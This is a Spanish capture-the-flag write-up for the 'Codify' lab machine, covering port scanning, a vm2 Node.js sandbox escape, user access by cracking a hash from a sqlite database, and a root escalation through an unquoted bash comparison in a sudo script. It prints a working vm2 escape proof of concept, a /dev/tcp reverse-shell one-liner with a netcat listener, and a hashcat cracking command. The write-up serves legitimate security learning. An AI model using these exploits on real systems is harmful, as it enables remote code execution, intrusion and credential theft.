---
title: "Codify"
date: "2025-03-07T00:04:43-05:00"
type: "maquinas"
draft: false
tags: ["python", "sudoers", "linux", "pspy", "vm2", "sqlite3", "nodejs"]
---

### Descripción:
Maquina muy entretenida que nos enseña a explotar una vulnerabilidad en la libreria vm2 para luego mediante una base de datos conseguir la flag de usuario para escalar privilegios mediante un permiso de sudoers que por una mala configuracion nos permite listar la contraseña de root.

# Enumeración

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn IP -oG allPorts
nmap -sCV -p22,80,3000 -A -oN target IP
```

<a href="https://imgur.com/nKoR4C8"><img src="https://i.imgur.com/nKoR4C8.png" title="source: imgur.com" /></a>

Si tratamos de usar gobuster no encontraremos ningun subdominio ni subdirectorio interesante por lo que no lo voy a mostrar.

## Puerto 80

<a href="https://imgur.com/k6NZ39V"><img src="https://i.imgur.com/k6NZ39V.png" title="source: imgur.com" /></a>

<a href="https://imgur.com/vlx4cMA"><img src="https://i.imgur.com/vlx4cMA.png" title="source: imgur.com" /></a>

Podemos ver como tenemos la posibilidad de ejecutar comandos `node.js` usando la libreria vm2 ademas de esto no vamos a encontrar nada más intreresante por lo que vamos a buscar vulnerabilidades de la libreria.

Encontraremos la siguiente poc para la libreria en github que es la que vamos a estar usando [POC](https://gist.github.com/seongil-wi/2a44e082001b959bfe304b62121fb76d).

```jsx
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('touch pwned');
}
`

console.log(vm.run(code));
```

<a href="https://imgur.com/EwJLJfF"><img src="https://i.imgur.com/EwJLJfF.png" title="source: imgur.com" /></a>

# User

Ya con esto vamos a poder ejecutar comandos y asi montar una revshell,  nos dirigiremos a la pagina [RevShells](https://www.revshells.com/) y en nuestra poc ejecutaremos el siguiente comando:

```bash
#Primero ponte en escucha en tu maquina (el siguiente comando)
bash -c "/bin/bash -i >& /dev/tcp/IP/PUERTO 0>&1" 
```

Y nos pondremos en escucha con netcat en nuestra maquina local:

```bash
nc -lvnp PUERTO
```

Ya con esto le pediremos a la pagina que ejecute nuestro codigo.

<a href="https://imgur.com/BgatqgV"><img src="https://i.imgur.com/BgatqgV.png" title="source: imgur.com" /></a>

Listo lo primero es hacer el tratamiento de la `tty`:

```bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

Ya en esta parte con find podemos encontrar una base de datos:

```bash
find /var/www/ -name *.db 2>/dev/null
```

Y veremos que hay una base de datos, usando file nos daremos cuenta que es una base de datos `sqlite`:

<a href="https://imgur.com/oYNhrQB"><img src="https://i.imgur.com/oYNhrQB.png" title="source: imgur.com" /></a>

Con esto podremos ver la base de datos que dentro tiene un hash:

<a href="https://imgur.com/YydnXgR"><img src="https://i.imgur.com/YydnXgR.png" title="source: imgur.com" /></a>

Y con el siguiente comando de hashcat podremos obtener la contraseña para ingresar como `joshua`:

```bash
hashcat hash.txt --wordlist /usr/share/wordlist/rockyou.txt -m 3200
```

# Root

<a href="https://imgur.com/GNcDqoF"><img src="https://i.imgur.com/GNcDqoF.png" title="source: imgur.com" /></a>

Enumerando encontramos este script que tenemos permiso de ejecutar como sudo:

<a href="https://imgur.com/AGLmyCR"><img src="https://i.imgur.com/AGLmyCR.png" title="source: imgur.com" /></a>

Si vemos el script esta mal montado por lo que cuando pida la contraseña podemos usar el * y nos dira que es correcto esto debido a que si no usamos dobles comillas para esas variables `DB_PASS` y `USER_PASS` podemos usar el * de forma que sin importar cual se la contraseña nos la dara como correcta esto tambien nos habilita la opcion de obtener la contraseña con python. Aquí un ejemplo de porque esto pasa:

<a href="https://imgur.com/WVdk3uj"><img src="https://i.imgur.com/WVdk3uj.png" title="source: imgur.com" /></a>

Para poder interceptar la contraseña vamos a usar [pspy](https://www.notion.so/Pspy-1a1094373800803aaa8bcb2094703815?pvs=21) igual que en las anteriores maquinas que lo hemos usado.

<a href="https://imgur.com/gLNcKij"><img src="https://i.imgur.com/gLNcKij.png" title="source: imgur.com" /></a>

Y ahi tenemos la contraseña.

> Si tienen curiosiodad de como se hacia mediante el script de python pueden ver esta parte del directo de [s4vitar](https://youtu.be/H7-Jd6HaLbI?t=2129).
>
